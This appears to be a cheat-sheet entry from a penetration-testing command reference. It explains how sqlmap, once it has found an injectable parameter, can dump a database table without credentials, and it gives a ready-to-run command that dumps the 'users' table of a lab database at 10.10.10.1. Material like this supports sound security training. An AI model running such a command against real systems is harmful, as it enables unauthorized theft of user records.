---
description: |
  Once sqlmap has confirmed an injectable parameter, it can be used to enumerate the back-end database schema and dump table contents directly through the injection point, without needing any credentials for the underlying application or database. The following command targets a specific database and table and dumps its contents in batch mode.

  Command Reference:

  	Target URL: http://10.10.10.1/page.php?id=1

  	Database: offsec_db

  	Table: users

command: |
  sqlmap -u "http://10.10.10.1/page.php?id=1" --batch -D offsec_db -T users --dump
items:
  - No_Creds
services:
  - Web
OS:
  - Linux
phases:
  - Exploitation
references:
  - https://github.com/sqlmapproject/sqlmap
  - https://github.com/sqlmapproject/sqlmap/wiki/Usage
---
